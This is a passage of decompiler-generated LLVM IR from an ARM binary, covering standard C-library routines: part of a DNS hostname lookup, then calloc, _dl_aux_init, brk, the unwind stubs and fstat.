dec_label_pc_1aa24:                               ; preds = %dec_label_pc_1aa1c
  %v3_1aa24 = icmp eq i32 %v2_1aa10, -1
  br i1 %v3_1aa24, label %dec_label_pc_1aa40, label %dec_label_pc_1ac04

dec_label_pc_1aa30:                               ; preds = %dec_label_pc_1aa10
  %v7_1aa30 = icmp eq i32 %v7_1aa00, 2
  br i1 %v7_1aa30, label %.thread1, label %bb29

bb29:                                             ; preds = %dec_label_pc_1aa30
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_1aa50

.thread1:                                         ; preds = %dec_label_pc_1aa30
  store i32 1, i32* @r7, align 4
  br label %dec_label_pc_1aa50

dec_label_pc_1aa40:                               ; preds = %dec_label_pc_1aa24
  %v0_1aa40 = load i32, i32* @r5, align 4
  %v1_1aa40 = inttoptr i32 %v0_1aa40 to i32*
  %v2_1aa40 = load i32, i32* %v1_1aa40, align 4
  store i32 %v2_1aa40, i32* %r3.global-to-local, align 4
  %v7_1aa44 = icmp eq i32 %v2_1aa40, 2
  br i1 %v7_1aa44, label %dec_label_pc_1aa4c, label %dec_label_pc_1ac04

dec_label_pc_1aa4c:                               ; preds = %dec_label_pc_1aa40, %dec_label_pc_1aa1c
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_1aa50

dec_label_pc_1aa50:                               ; preds = %bb29, %.thread1, %dec_label_pc_1aa4c
  %v0_1aa50 = load i32, i32* @r8, align 4
  %v1_1aa50 = sub i32 0, %v0_1aa50
  %v1_1aa54 = urem i32 %v1_1aa50, 4
  store i32 %v1_1aa54, i32* %r0.global-to-local, align 4
  %v1_1aa58 = load i32, i32* @sl, align 4
  %v2_1aa58 = sub i32 %v1_1aa58, %v1_1aa54
  %v1_1aa5c = add i32 %v2_1aa58, -24
  store i32 %v1_1aa5c, i32* @sl, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_1aa68 = load i32, i32* @r4, align 4
  %v1_1aa68 = load i32, i32* @r5, align 4
  %v2_1aa68 = inttoptr i32 %v1_1aa68 to i32*
  store i32 %v0_1aa68, i32* %v2_1aa68, align 4
  %v7_1aa6c = icmp sgt i32 %v1_1aa5c, 255
  br i1 %v7_1aa6c, label %dec_label_pc_1aa78, label %bb30

bb30:                                             ; preds = %dec_label_pc_1aa50
  store i32 34, i32* %r0.global-to-local, align 4
  %v0_1aa70 = load i32, i32* %r3.global-to-local, align 4
  %v1_1aa70 = load i32, i32* @fp, align 4
  %v2_1aa70 = inttoptr i32 %v1_1aa70 to i32*
  store i32 %v0_1aa70, i32* %v2_1aa70, align 4
  br label %dec_label_pc_1ac04

dec_label_pc_1aa78:                               ; preds = %dec_label_pc_1aa50
  %v0_1aa703 = load i32, i32* %r3.global-to-local, align 4
  %v1_1aa704 = load i32, i32* @fp, align 4
  %v2_1aa705 = inttoptr i32 %v1_1aa704 to i32*
  store i32 %v0_1aa703, i32* %v2_1aa705, align 4
  %v0_1aa78 = load i32, i32* @r8, align 4
  %v1_1aa78 = load i32, i32* %r0.global-to-local, align 4
  %v2_1aa78 = add i32 %v1_1aa78, %v0_1aa78
  store i32 %v2_1aa78, i32* @r8, align 4
  store i32 0, i32* @r4, align 4
  %v1_1aa80 = add i32 %v2_1aa78, 16
  store i32 %v1_1aa80, i32* %r2.global-to-local, align 4
  %v1_1aa84 = add i32 %v2_1aa78, 24
  store i32 %v1_1aa84, i32* @r5, align 4
  %v3_1aa8c = inttoptr i32 %v1_1aa80 to i32*
  store i32 %v2_1aa78, i32* %v3_1aa8c, align 4
  %v0_1aa90 = load i32, i32* @sb, align 4
  store i32 %v0_1aa90, i32* @r1, align 4
  %v0_1aa94 = load i32, i32* @r4, align 4
  %v1_1aa94 = load i32, i32* %r2.global-to-local, align 4
  %v2_1aa94 = add i32 %v1_1aa94, 4
  %v3_1aa94 = inttoptr i32 %v2_1aa94 to i32*
  store i32 %v0_1aa94, i32* %v3_1aa94, align 4
  %v0_1aa98 = load i32, i32* @r5, align 4
  store i32 %v0_1aa98, i32* %r0.global-to-local, align 4
  %v0_1aa9c = load i32, i32* @sl, align 4
  store i32 %v0_1aa9c, i32* %r2.global-to-local, align 4
  %v3_1aaa0 = call i32 @strncpy(i32 %v0_1aa98, i32 %v0_1aa90, i32 %v0_1aa9c)
  %v0_1aaa4 = load i32, i32* @r4, align 4
  %v1_1aaa4 = trunc i32 %v0_1aaa4 to i8
  %v2_1aaa4 = load i32, i32* @r5, align 4
  %v3_1aaa4 = load i32, i32* @sl, align 4
  %v4_1aaa4 = add i32 %v3_1aaa4, %v2_1aaa4
  %v5_1aaa4 = inttoptr i32 %v4_1aaa4 to i8*
  store i8 %v1_1aaa4, i8* %v5_1aaa4, align 1
  %v0_1aaa8 = load i32, i32* @sb, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_1aab0 = load i32, i32* @r8, align 4
  store i32 %v0_1aab0, i32* %r2.global-to-local, align 4
  %v3_1aab4 = inttoptr i32 %v0_1aaa8 to i8*
  %v4_1aab4 = call i32 @inet_pton(i32 10, i8* %v3_1aab4, i32 %v0_1aab0)
  store i32 %v4_1aab4, i32* %r0.global-to-local, align 4
  %v1_1aab8 = load i32, i32* @r4, align 4
  %v9_1aab8 = icmp eq i32 %v4_1aab4, %v1_1aab8
  br i1 %v9_1aab8, label %dec_label_pc_1aaf0, label %dec_label_pc_1aac0

dec_label_pc_1aac0:                               ; preds = %dec_label_pc_1aa78
  store i32 %v1_1aa80, i32* @ip, align 4
  %v0_1aac8 = load i32, i32* @r6, align 4
  store i32 %v0_1aac8, i32* %v2_1a9c4, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_1aad0 = load i32, i32* @r6, align 4
  %v2_1aad0 = add i32 %v1_1aad0, 8
  %v3_1aad0 = inttoptr i32 %v2_1aad0 to i32*
  store i32 10, i32* %v3_1aad0, align 4
  %v0_1aad4 = load i32, i32* @r4, align 4
  store i32 %v0_1aad4, i32* %r0.global-to-local, align 4
  %v0_1aad8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1aad8 = add i32 %v0_1aad8, 6
  store i32 %v1_1aad8, i32* %r3.global-to-local, align 4
  %v1_1aadc = load i32, i32* @r6, align 4
  %v2_1aadc = add i32 %v1_1aadc, 12
  %v3_1aadc = inttoptr i32 %v2_1aadc to i32*
  store i32 %v1_1aad8, i32* %v3_1aadc, align 4
  %v0_1aae0 = load i32, i32* @r5, align 4
  %v1_1aae0 = load i32, i32* @r6, align 4
  %v2_1aae0 = inttoptr i32 %v1_1aae0 to i32*
  store i32 %v0_1aae0, i32* %v2_1aae0, align 4
  %v0_1aae4 = load i32, i32* @ip, align 4
  %v1_1aae4 = load i32, i32* @r6, align 4
  %v2_1aae4 = add i32 %v1_1aae4, 16
  %v3_1aae4 = inttoptr i32 %v2_1aae4 to i32*
  store i32 %v0_1aae4, i32* %v3_1aae4, align 4
  %v0_1aae8 = load i32, i32* @r4, align 4
  %v1_1aae8 = load i32, i32* @fp, align 4
  %v2_1aae8 = inttoptr i32 %v1_1aae8 to i32*
  store i32 %v0_1aae8, i32* %v2_1aae8, align 4
  br label %dec_label_pc_1ac04

dec_label_pc_1aaf0:                               ; preds = %dec_label_pc_1aa78
  %v0_1aaf0 = load i32, i32* @r7, align 4
  %v2_1aaf0 = icmp eq i32 %v0_1aaf0, 0
  br i1 %v2_1aaf0, label %dec_label_pc_1aaf8, label %dec_label_pc_1abf0

dec_label_pc_1aaf8:                               ; preds = %dec_label_pc_1aaf0
  %v2_1aaf8 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_1aaf8, i32* @r4, align 4
  store i32 %v2_1aaf8, i32* %r0.global-to-local, align 4
  store i32 40, i32* @r2, align 4
  %v2_1ab08 = bitcast i32* %stack_var_-84 to i8*
  %v3_1ab08 = call i32 @__GI_memset(i8* %v2_1ab08, i32 0)
  store i32 %v3_1ab08, i32* %r0.global-to-local, align 4
  %v2_1ab10 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_1ab10, i32* @sb, align 4
  %v7_1ab50 = icmp eq i32 %tmp9, 5
  br label %dec_label_pc_1ab14

dec_label_pc_1ab14:                               ; preds = %dec_label_pc_1ab68, %dec_label_pc_1aaf8
  store i32 %v2_1ab10, i32* %r2.global-to-local, align 4
  store i32 %v2_1aaf8, i32* %r3.global-to-local, align 4
  %v0_1ab20 = load i32, i32* @r5, align 4
  store i32 %v0_1ab20, i32* %r0.global-to-local, align 4
  %v4_1ab24 = inttoptr i32 %v0_1ab20 to i8*
  %v5_1ab24 = call i32 @__dns_lookup(i8* %v4_1ab24, i32 28, i32 %v2_1ab10, i32 %v2_1aaf8)
  store i32 %v5_1ab24, i32* @r4, align 4
  %v1_1ab28 = icmp slt i32 %v5_1ab24, 0
  %v0_1ab2c = load i32, i32* @sl, align 4
  store i32 %v0_1ab2c, i32* %r2.global-to-local, align 4
  %v0_1ab30 = load i32, i32* @r7, align 4
  %v1_1ab30 = add i32 %v0_1ab30, 1
  store i32 %v1_1ab30, i32* @r7, align 4
  %v0_1ab34 = load i32, i32* @r5, align 4
  store i32 %v0_1ab34, i32* %r0.global-to-local, align 4
  br i1 %v1_1ab28, label %dec_label_pc_1abf0, label %dec_label_pc_1ab3c

dec_label_pc_1ab3c:                               ; preds = %dec_label_pc_1ab14
  %v3_1ab3c = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1ab3c, i32* @r1, align 4
  %v3_1ab40 = call i32 @strncpy(i32 %v0_1ab34, i32 %v3_1ab3c, i32 %v0_1ab2c)
  %v3_1ab44 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1ab44, i32* @r0, align 4
  %v0_1ab48 = call i32 @free()
  store i32 %v0_1ab48, i32* %r0.global-to-local, align 4
  %v0_1ab54 = load i32, i32* @r4, align 4
  store i32 %v0_1ab54, i32* %r2.global-to-local, align 4
  %v0_1ab58 = load i32, i32* @r5, align 4
  store i32 %v0_1ab58, i32* @r3, align 4
  br i1 %v7_1ab50, label %dec_label_pc_1ab60, label %dec_label_pc_1ab98

dec_label_pc_1ab60:                               ; preds = %dec_label_pc_1ab3c
  %v0_1ab60 = load i32, i32* @r7, align 4
  %v8_1ab64 = icmp sgt i32 %v0_1ab60, 5
  br i1 %v8_1ab64, label %dec_label_pc_1ab8c, label %dec_label_pc_1ab68

dec_label_pc_1ab68:                               ; preds = %dec_label_pc_1ab60
  store i32 %tmp8, i32* @r1, align 4
  %v3_1ab6c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1ab6c, i32* %r0.global-to-local, align 4
  %v0_1ab70 = load i32, i32* @sl, align 4
  %v5_1ab74 = call i32 @__decode_dotted(i32 %v3_1ab6c, i32 %tmp8, i32 %v0_1ab54, i32 %v0_1ab58, i32 %v0_1ab70)
  store i32 %v5_1ab74, i32* @r4, align 4
  %v3_1ab7c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1ab7c, i32* @r0, align 4
  %v0_1ab80 = call i32 @free()
  store i32 %v0_1ab80, i32* %r0.global-to-local, align 4
  %v0_1ab84 = load i32, i32* @r4, align 4
  %v1_1ab84 = icmp slt i32 %v0_1ab84, 0
  br i1 %v1_1ab84, label %dec_label_pc_1ab8c, label %dec_label_pc_1ab14

dec_label_pc_1ab8c:                               ; preds = %dec_label_pc_1ab68, %dec_label_pc_1ab60
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1abf8

dec_label_pc_1ab98:                               ; preds = %dec_label_pc_1ab3c
  %v7_1ab98 = icmp eq i32 %tmp9, 28
  br i1 %v7_1ab98, label %dec_label_pc_1aba0, label %dec_label_pc_1abe8

dec_label_pc_1aba0:                               ; preds = %dec_label_pc_1ab98
  store i32 16, i32* @r2, align 4
  %v0_1aba8 = load i32, i32* @r8, align 4
  store i32 %v0_1aba8, i32* @r0, align 4
  %v0_1abac = call i32 @memcpy()
  store i32 10, i32* %r3.global-to-local, align 4
  store i32 %v1_1aa80, i32* %r2.global-to-local, align 4
  %v1_1abb8 = load i32, i32* @r6, align 4
  %v2_1abb8 = add i32 %v1_1abb8, 8
  %v3_1abb8 = inttoptr i32 %v2_1abb8 to i32*
  store i32 10, i32* %v3_1abb8, align 4
  %v0_1abbc = load i32, i32* %r3.global-to-local, align 4
  %v1_1abbc = add i32 %v0_1abbc, 6
  store i32 %v1_1abbc, i32* %r3.global-to-local, align 4
  %v1_1abc0 = load i32, i32* @r6, align 4
  %v2_1abc0 = add i32 %v1_1abc0, 12
  %v3_1abc0 = inttoptr i32 %v2_1abc0 to i32*
  store i32 %v1_1abbc, i32* %v3_1abc0, align 4
  %v3_1abc4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1abc4, i32* @r0, align 4
  %v0_1abc8 = load i32, i32* @r5, align 4
  %v1_1abc8 = load i32, i32* @r6, align 4
  %v2_1abc8 = inttoptr i32 %v1_1abc8 to i32*
  store i32 %v0_1abc8, i32* %v2_1abc8, align 4
  %v0_1abcc = load i32, i32* %r2.global-to-local, align 4
  %v1_1abcc = load i32, i32* @r6, align 4
  %v2_1abcc = add i32 %v1_1abcc, 16
  %v3_1abcc = inttoptr i32 %v2_1abcc to i32*
  store i32 %v0_1abcc, i32* %v3_1abcc, align 4
  %v0_1abd0 = call i32 @free()
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1abe0 = load i32, i32* @r6, align 4
  store i32 %v0_1abe0, i32* %v2_1a9c4, align 4
  %v0_1abf8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1abf8

dec_label_pc_1abe8:                               ; preds = %dec_label_pc_1ab98
  %v3_1abe8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1abe8, i32* @r0, align 4
  %v0_1abec = call i32 @free()
  store i32 %v0_1abec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1abf0

dec_label_pc_1abf0:                               ; preds = %dec_label_pc_1ab14, %dec_label_pc_1aaf0, %dec_label_pc_1abe8
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1abf8

dec_label_pc_1abf8:                               ; preds = %dec_label_pc_1aba0, %dec_label_pc_1ab8c, %dec_label_pc_1abf0
  %v0_1abf8 = phi i32 [ %v0_1abf8.pre, %dec_label_pc_1aba0 ], [ 3, %dec_label_pc_1ab8c ], [ 1, %dec_label_pc_1abf0 ]
  %v1_1abf8 = load i32, i32* @fp, align 4
  %v2_1abf8 = inttoptr i32 %v1_1abf8 to i32*
  store i32 %v0_1abf8, i32* %v2_1abf8, align 4
  br label %dec_label_pc_1ac04

dec_label_pc_1ac00:                               ; preds = %dec_label_pc_1a9b8, %dec_label_pc_1a9cc
  store i32 22, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ac04

dec_label_pc_1ac04:                               ; preds = %bb, %bb30, %dec_label_pc_1aa40, %dec_label_pc_1aa24, %dec_label_pc_1abf8, %dec_label_pc_1aac0, %dec_label_pc_1a998, %dec_label_pc_1ac00
  store i32 %v9_1a970, i32* @r6, align 4
  store i32 %v12_1a970, i32* @r7, align 4
  store i32 %v15_1a970, i32* @r8, align 4
  store i32 %v18_1a970, i32* @sb, align 4
  store i32 %v21_1a970, i32* @sl, align 4
  %v1_1ac0c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1ac0c

; uselistorder directives
  uselistorder i32 %v2_1aaf8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1aa80, { 2, 1, 0, 3 }
  uselistorder i32 %v1_1aa54, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 2, 0, 3 }
  uselistorder i32 %tmp8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 22, 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 12, 10, 11, 14, 13, 15, 17, 16, 18, 20, 19, 21, 23 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 1, 0, 2 }
  uselistorder i32 -24, { 2, 1, 0 }
  uselistorder i32 %arg6, { 4, 3, 0, 2, 1 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1ac04, { 7, 4, 5, 1, 2, 3, 0, 6 }
  uselistorder label %dec_label_pc_1ac00, { 1, 0 }
  uselistorder label %dec_label_pc_1abf8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1abf0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1aa50, { 2, 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_1ac10 = load i32, i32* @r4, align 4
  %v6_1ac10 = load i32, i32* @r5, align 4
  %v9_1ac10 = load i32, i32* @r6, align 4
  %v12_1ac10 = load i32, i32* @lr, align 4
  %v2_1ac18 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_1ac28 = mul i32 %arg2, %arg1
  store i32 %v2_1ac28, i32* @r6, align 4
  br i1 %v2_1ac18, label %dec_label_pc_1ac58, label %dec_label_pc_1ac30

dec_label_pc_1ac30:                               ; preds = %entry
  %v2_1ac38 = udiv i32 %v2_1ac28, %arg1
  %v9_1ac3c = icmp eq i32 %v2_1ac38, %arg2
  br i1 %v9_1ac3c, label %dec_label_pc_1ac58, label %dec_label_pc_1ac44

dec_label_pc_1ac44:                               ; preds = %dec_label_pc_1ac30
  %v0_1ac44 = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1ac50 = inttoptr i32 %v0_1ac44 to i32*
  store i32 12, i32* %v2_1ac50, align 4
  br label %dec_label_pc_1ad1c

dec_label_pc_1ac58:                               ; preds = %dec_label_pc_1ac30, %entry
  %v4_1ac5c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 72) to i32*), align 4
  store i32 %v4_1ac5c, i32* @r4, align 4
  %v4_1ac74 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 76) to i32*), align 4
  store i32 %v4_1ac74, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1ac74)
  %v0_1ac88 = load i32, i32* @r5, align 4
  %v2_1ac88 = add i32 %v0_1ac88, 16
  %v3_1ac88 = inttoptr i32 %v2_1ac88 to i32*
  %v4_1ac88 = load i32, i32* %v3_1ac88, align 4
  store i32 %v4_1ac88, i32* %ip.global-to-local, align 4
  store i32 109716, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1ac88)
  %v0_1ac94 = load i32, i32* @r6, align 4
  %v1_1ac98 = call i32 @malloc(i32 %v0_1ac94)
  store i32 %v1_1ac98, i32* %r4.global-to-local, align 4
  %v2_1ac9c = icmp eq i32 %v1_1ac98, 0
  br i1 %v2_1ac9c, label %.thread, label %dec_label_pc_1aca4

dec_label_pc_1aca4:                               ; preds = %dec_label_pc_1ac58
  %v1_1aca4 = add i32 %v1_1ac98, -4
  %v2_1aca4 = inttoptr i32 %v1_1aca4 to i32*
  %v3_1aca4 = load i32, i32* %v2_1aca4, align 4
  %v1_1aca8 = and i32 %v3_1aca4, 2
  %v2_1aca8 = icmp eq i32 %v1_1aca8, 0
  br i1 %v2_1aca8, label %dec_label_pc_1acb0, label %.thread

dec_label_pc_1acb0:                               ; preds = %dec_label_pc_1aca4
  %v1_1acb06 = add i32 %v3_1aca4, -4
  %v1_1acb4 = and i32 %v1_1acb06, -4
  store i32 %v1_1acb4, i32* @r2, align 4
  %v3_1acb8 = udiv i32 %v1_1acb4, 4
  store i32 %v3_1acb8, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_1acb4, 36
  %v2_1acc0 = icmp ult i32 %v1_1acb4, 33
  %v3_1acc0 = or i1 %tmp, %v2_1acc0
  br i1 %v3_1acc0, label %dec_label_pc_1accc, label %dec_label_pc_1acc4

dec_label_pc_1acc4:                               ; preds = %dec_label_pc_1acb0
  %v2_1acc4 = inttoptr i32 %v1_1ac98 to i8*
  %v3_1acc4 = call i32 @__GI_memset(i8* %v2_1acc4, i32 0)
  br label %.thread

dec_label_pc_1accc:                               ; preds = %dec_label_pc_1acb0
  %tmp7 = icmp eq i32 %v1_1acb4, 16
  %v2_1acd0 = inttoptr i32 %v1_1ac98 to i32*
  store i32 0, i32* %v2_1acd0, align 4
  %v1_1acd4 = load i32, i32* %r4.global-to-local, align 4
  %v2_1acd4 = add i32 %v1_1acd4, 4
  %v3_1acd4 = inttoptr i32 %v2_1acd4 to i32*
  store i32 0, i32* %v3_1acd4, align 4
  %v1_1acd8 = load i32, i32* %r4.global-to-local, align 4
  %v2_1acd8 = add i32 %v1_1acd8, 8
  %v3_1acd8 = inttoptr i32 %v2_1acd8 to i32*
  store i32 0, i32* %v3_1acd8, align 4
  %v2_1acdc = icmp ult i32 %v1_1acb4, 13
  %v3_1acdc = or i1 %tmp7, %v2_1acdc
  br i1 %v3_1acdc, label %.thread, label %dec_label_pc_1ace0

dec_label_pc_1ace0:                               ; preds = %dec_label_pc_1accc
  %v0_1ace0 = load i32, i32* %ip.global-to-local, align 4
  %v1_1ace4 = load i32, i32* %r4.global-to-local, align 4
  %v2_1ace4 = add i32 %v1_1ace4, 12
  %v3_1ace4 = inttoptr i32 %v2_1ace4 to i32*
  store i32 0, i32* %v3_1ace4, align 4
  %v1_1ace8 = load i32, i32* %r4.global-to-local, align 4
  %v2_1ace8 = add i32 %v1_1ace8, 16
  %v3_1ace8 = inttoptr i32 %v2_1ace8 to i32*
  store i32 0, i32* %v3_1ace8, align 4
  %tmp8 = icmp ult i32 %v0_1ace0, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_1acf0

dec_label_pc_1acf0:                               ; preds = %dec_label_pc_1ace0
  %v0_1acf0 = load i32, i32* %ip.global-to-local, align 4
  %v7_1acf0 = icmp eq i32 %v0_1acf0, 9
  %v1_1acf4 = load i32, i32* %r4.global-to-local, align 4
  %v2_1acf4 = add i32 %v1_1acf4, 20
  %v3_1acf4 = inttoptr i32 %v2_1acf4 to i32*
  store i32 0, i32* %v3_1acf4, align 4
  %v1_1acf8 = load i32, i32* %r4.global-to-local, align 4
  %v2_1acf8 = add i32 %v1_1acf8, 24
  %v3_1acf8 = inttoptr i32 %v2_1acf8 to i32*
  store i32 0, i32* %v3_1acf8, align 4
  br i1 %v7_1acf0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1acf0
  %v2_1acfc = load i32, i32* %r4.global-to-local, align 4
  %v3_1acfc = add i32 %v2_1acfc, 32
  %v4_1acfc = inttoptr i32 %v3_1acfc to i32*
  store i32 0, i32* %v4_1acfc, align 4
  %v2_1ad00 = load i32, i32* %r4.global-to-local, align 4
  %v3_1ad00 = add i32 %v2_1ad00, 28
  %v4_1ad00 = inttoptr i32 %v3_1ad00 to i32*
  store i32 0, i32* %v4_1ad00, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1acf0, %dec_label_pc_1aca4, %dec_label_pc_1ace0, %dec_label_pc_1accc, %dec_label_pc_1ac58, %dec_label_pc_1acc4, %bb
  %v0_1ad10 = load i32, i32* @r5, align 4
  %v2_1ad10 = add i32 %v0_1ad10, 24
  %v3_1ad10 = inttoptr i32 %v2_1ad10 to i32*
  %v4_1ad10 = load i32, i32* %v3_1ad10, align 4
  store i32 %v4_1ad10, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_1ad10)
  br label %dec_label_pc_1ad1c

dec_label_pc_1ad1c:                               ; preds = %dec_label_pc_1ac44, %.thread
  %v0_1ad1c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_1ac10, i32* @r4, align 4
  store i32 %v6_1ac10, i32* @r5, align 4
  store i32 %v9_1ac10, i32* @r6, align 4
  store i32 %v12_1ac10, i32* @lr, align 4
  ret i32 %v0_1ad1c

; uselistorder directives
  uselistorder i32 %v1_1acb4, { 0, 5, 1, 4, 3, 2 }
  uselistorder i32 %v1_1ac98, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 13, { 0, 3, 4, 6, 5, 1, 7, 2, 8 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1ad1c, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_1ad30(i32 %arg1) local_unnamed_addr {
dec_label_pc_1ad30:
  %v0_1ad30 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1ad30, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_1ad30
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1ad30, %bb
  %v10_1ad40 = phi i32 [ %arg1, %dec_label_pc_1ad30 ], [ 0, %bb ]
  ret i32 %v10_1ad40

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r2.global-to-local, align 4
  %v4_1ad50 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 104) to i32*), align 4
  %v4_1ad58 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 68) to i32*), align 4
  store i32 %v4_1ad58, i32* %r1.global-to-local, align 4
  %v1_1ad5c = add i32 %arg1, 44
  %v2_1ad5c = inttoptr i32 %v1_1ad5c to i32*
  %v3_1ad5c = load i32, i32* %v2_1ad5c, align 4
  %v1_1ad60 = add i32 %arg1, 28
  %v2_1ad60 = inttoptr i32 %v1_1ad60 to i32*
  %v3_1ad60 = load i32, i32* %v2_1ad60, align 4
  store i32 %v3_1ad60, i32* %r2.global-to-local, align 4
  %v2_1ad64 = inttoptr i32 %v4_1ad50 to i32*
  store i32 %v3_1ad5c, i32* %v2_1ad64, align 4
  %v0_1ad68 = load i32, i32* %r2.global-to-local, align 4
  %v1_1ad68 = load i32, i32* %r1.global-to-local, align 4
  %v2_1ad68 = inttoptr i32 %v1_1ad68 to i32*
  store i32 %v0_1ad68, i32* %v2_1ad68, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_1ad74(i32 %arg1) local_unnamed_addr {
dec_label_pc_1ad74:
  %v0_1ad74 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1ad74, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1ad74
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1ad74, %bb
  %v4_1ad78 = phi i32 [ %arg1, %dec_label_pc_1ad74 ], [ 0, %bb ]
  ret i32 %v4_1ad78

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_1adb8:
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 26460) to i32*), align 4
  ret i32 0
}

define i32 @__aeabi_unwind_cpp_pr0() local_unnamed_addr {
entry:
  %v1_1adc8 = load i32, i32* @r0, align 4
  ret i32 %v1_1adc8
}

define i32 @__aeabi_unwind_cpp_pr1() local_unnamed_addr {
entry:
  %v1_1adcc = load i32, i32* @r0, align 4
  ret i32 %v1_1adcc
}

define i32 @__aeabi_unwind_cpp_pr2() local_unnamed_addr {
entry:
  %v1_1add0 = load i32, i32* @r0, align 4
  ret i32 %v1_1add0
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_1addc = load i32, i32* @r1, align 4
  store i32 %v0_1addc, i32* @r3, align 4
  %v0_1adec = load i32, i32* @r0, align 4
  store i32 %v0_1adec, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1adec, -4095
  br i1 %tmp, label %dec_label_pc_1ae0c, label %dec_label_pc_1adf8

dec_label_pc_1adf8:                               ; preds = %entry
  %v0_1adf8 = call i32 @__GI___errno_location()
  %v0_1adfc = load i32, i32* %r7.global-to-local, align 4
  %v1_1adfc = sub i32 0, %v0_1adfc
  store i32 %v1_1adfc, i32* @r3, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1ae04 = inttoptr i32 %v0_1adf8 to i32*
  store i32 %v1_1adfc, i32* %v2_1ae04, align 4
  br label %dec_label_pc_1ae1c

dec_label_pc_1ae0c:                               ; preds = %entry
  %v2_1ae0c = icmp eq i32 %v0_1adec, 0
  br i1 %v2_1ae0c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1ae0c
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1ae0c, %bb
  call void @__pseudo_cond_branch(i1 %v2_1ae0c, i32 ptrtoint (i32* @global_var_1afa4.1149 to i32))
  br label %dec_label_pc_1ae1c

dec_label_pc_1ae1c:                               ; preds = %dec_label_pc_1adf8, %.thread
  %v0_1ae1c = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_1ae1c

; uselistorder directives
